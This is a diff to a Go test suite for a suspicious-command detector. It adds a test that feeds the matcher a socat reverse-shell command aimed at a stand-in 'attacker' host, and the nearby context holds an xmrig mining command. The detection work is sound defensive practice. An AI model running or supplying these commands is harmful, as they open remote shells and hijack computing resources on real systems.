@@ -32,6 +32,13 @@ func TestMatchSuspiciousExec_SocatExec(t *testing.T) {
 	}
 }
 
+func TestMatchSuspiciousExec_SocatSystem(t *testing.T) {
+	cmd := "socat openssl:attacker:443 system:sh"
+	if p := match(cmd); p != "socat-system" {
+		t.Errorf("cmd=%q: got %q, want socat-system", cmd, p)
+	}
+}
+
 func TestMatchSuspiciousExec_Xmrig(t *testing.T) {
 	cmd := "/tmp/xmrig --pool pool.minexmr.com:4444"
 	if p := match(cmd); p != "xmrig" {
